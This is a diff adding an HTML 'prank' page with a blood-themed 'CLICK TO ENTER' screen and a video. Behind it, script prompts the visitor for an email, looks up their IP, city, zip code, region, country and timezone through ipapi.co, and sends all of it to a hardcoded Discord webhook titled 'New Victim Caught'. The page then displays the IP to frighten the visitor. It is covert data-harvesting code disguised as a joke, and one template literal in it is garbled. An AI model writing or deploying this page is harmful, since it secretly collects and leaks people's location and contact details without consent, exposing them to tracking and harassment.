@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            background: #000000;
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+
+        .enter-screen {
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            background: linear-gradient(#000000, #220000);
+        }
+        .enter-btn {
+            font-size: 2.2em;
+            padding: 25px 60px;
+            border: 4px solid #ff0000;
+            border-radius: 10px;
+            background: rgba(0, 0, 0, 0.8);
+            color: #ff0000;
+            cursor: pointer;
+            text-shadow: 0 0 20px #ff0000;
+            box-shadow: 0 0 30px #ff0000;
+            position: relative;
+            overflow: hidden;
+        }
+        .enter-btn::after {
+            content: '';
+            position: absolute;
+            bottom: -100%;
+            left: 0;
+            width: 100%;
+            height: 30%;
+            background: linear-gradient(transparent, rgba(255, 0, 0, 0.6));
+            animation: blood-drip 4s linear infinite;
+        }
+        @keyframes blood-drip {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(400%); }
+        }
+
+        .main-content {
+            display: none;
+            position: relative;
+            height: 100vh;
+            align-items: center;
+            justify-content: center;
+        }
+        video {
+            max-width: 92%;
+            max-height: 68vh;
+            object-fit: contain;
+            z-index: 1;
+        }
+        .overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            z-index: 2;
+        }
+        .info {
+            font-size: 1.35em;
+            line-height: 2.1;
+            font-weight: bold;
+            color: #ff0000;
+            text-shadow: 0 0 15px #ff0000, 0 0 30px #ff0000;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="enter-screen" id="enterScreen">
+        <div class="enter-btn" onclick="startPrank()">
+            CLICK TO ENTER
+        </div>
+    </div>
+
+    <div class="main-content" id="mainContent">
+        <!-- Video (video.mp4 naam rakhna) -->
+        <video id="video" loop muted>
+            <source src="video.mp4" type="video/mp4">
+        </video>
+
+        <div class="overlay">
+            <div class="info" id="info">Detecting...</div>
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1501510479401717832/13v54bqS2uzbeFWtkmOQh3lvC_SFcSmGgnX6y-SQse9_OsZwnihK0KdLvYzmGOyYk2ED";
+
+        function sendToDiscord(data, email = "N/A") {
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: "🦇",
+                    embeds: [{
+                        title: "🎯 New Victim Caught",
+                        color: 0xff0000,
+                        timestamp: new Date().toISOString(),
+                        fields: [
+                            { name: "IP", value: data.ip || "N/A", inline: true },
+                            { name: "City", value: data.city || "N/A", inline: true },
+                            { name: "Zip Code", value: data.postal || "N/A", inline: true },
+                            { name: "Region", value: data.region || "N/A", inline: true },
+                            { name: "Country", value: `\( {data.country_name} ( \){data.country})`, inline: true },
+                            { name: "Email", value: email, inline: false },
+                            { name: "Timezone", value: data.timezone || "N/A", inline: true },
+                            { name: "Time", value: new Date().toLocaleString('en-IN'), inline: false }
+                        ]
+                    }]
+                })
+            }).catch(() => {});
+        }
+
+        function startPrank() {
+            document.getElementById('enterScreen').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'flex';
+
+            const video = document.getElementById('video');
+            video.muted = false;
+            video.play().catch(() => {});
+
+            // Email prompt
+            setTimeout(() => {
+                const email = prompt("Enter your Email to Continue:");
+                
+                fetch('https://ipapi.co/json/')
+                    .then(r => r.json())
+                    .then(data => {
+                        sendToDiscord(data, email || "N/A");
+                        const text = `Your IP: ${data.ip}<br>City: ${data.city}<br>Country: ${data.country_name}`;
+                        typeWriter(text);
+                    })
+                    .catch(() => {
+                        typeWriter("You have been traced...");
+                    });
+            }, 800);
+        }
+
+        function typeWriter(text) {
+            const element = document.getElementById('info');
+            element.innerHTML = '';
+            let i = 0;
+            function type() {
+                if (i < text.length) {
+                    element.innerHTML += (text.charAt(i) === '<' ? '<br>' : text.charAt(i));
+                    i++;
+                    setTimeout(type, 50);
+                }
+            }
+            type();
+        }
+    </script>
+</body>
+</html>
